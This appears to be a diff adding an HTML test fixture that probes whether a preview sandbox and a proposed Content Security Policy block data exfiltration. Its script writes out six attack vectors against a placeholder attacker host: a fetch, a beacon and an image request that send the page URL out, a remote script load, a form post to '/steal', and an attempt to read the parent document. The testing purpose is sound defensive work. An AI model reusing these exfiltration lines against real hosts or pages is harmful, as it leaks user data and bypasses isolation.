@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<title>Malicious preview fixture</title>
+</head>
+<body>
+  <p>恶意预览探针：尝试数据外发与源访问。当前 csp:null 下这些请求会真正发出。</p>
+  <img id="beacon-img" alt="beacon">
+  <script>
+    // F-S02 malicious preview probe. Each vector records whether it succeeded
+    // onto the document so a harness can read the outcome. None of these
+    // should succeed under the proposed CSP.
+    var PROBE_ORIGIN = 'https://fox-harness-attacker.invalid';
+    var results = {};
+
+    function record(name, outcome) {
+      results[name] = outcome;
+      document.title = 'malicious-probe:' + JSON.stringify(results);
+    }
+
+    // 1. fetch() exfiltration (CSP connect-src must block; CORS would block
+    //    reading the response, but the request itself must not even go out).
+    try {
+      fetch(PROBE_ORIGIN + '/exfil?d=' + encodeURIComponent(location.href), { mode: 'no-cors' })
+        .then(function () { record('fetch', 'sent'); })
+        .catch(function () { record('fetch', 'blocked'); });
+    } catch (error) {
+      record('fetch', 'blocked');
+    }
+
+    // 2. sendBeacon (connect-src).
+    try {
+      var sent = navigator.sendBeacon(PROBE_ORIGIN + '/beacon', 'probe');
+      record('beacon', sent ? 'sent' : 'blocked');
+    } catch (error) {
+      record('beacon', 'blocked');
+    }
+
+    // 3. <img> beacon (img-src must block; the request must not go out).
+    var img = document.getElementById('beacon-img');
+    img.onerror = function () { record('img-beacon', 'blocked'); };
+    img.onload = function () { record('img-beacon', 'sent'); };
+    img.src = PROBE_ORIGIN + '/img-beacon?d=' + encodeURIComponent(location.href);
+
+    // 4. Cross-origin parent access must be blocked by the sandbox's opaque
+    //    origin regardless of CSP; recorded to prove the isolation layer too.
+    try {
+      var parentDocument = window.parent.document;
+      record('parent-access', parentDocument ? 'succeeded' : 'blocked');
+    } catch (error) {
+      record('parent-access', 'blocked');
+    }
+
+    // 5. Attempt to load a remote script (script-src must block).
+    var remote = document.createElement('script');
+    remote.src = PROBE_ORIGIN + '/evil.js';
+    remote.onload = function () { record('remote-script', 'loaded'); };
+    remote.onerror = function () { record('remote-script', 'blocked'); };
+    document.body.appendChild(remote);
+
+    // 6. Attempt to submit a form to a remote endpoint (form-action must block).
+    var form = document.createElement('form');
+    form.action = PROBE_ORIGIN + '/steal';
+    form.method = 'POST';
+    document.body.appendChild(form);
+    try {
+      form.requestSubmit();
+      record('form-action', 'submitted');
+    } catch (error) {
+      record('form-action', 'blocked');
+    }
+
+    document.title = 'malicious-probe-started';
+  </script>
+</body>
+</html>
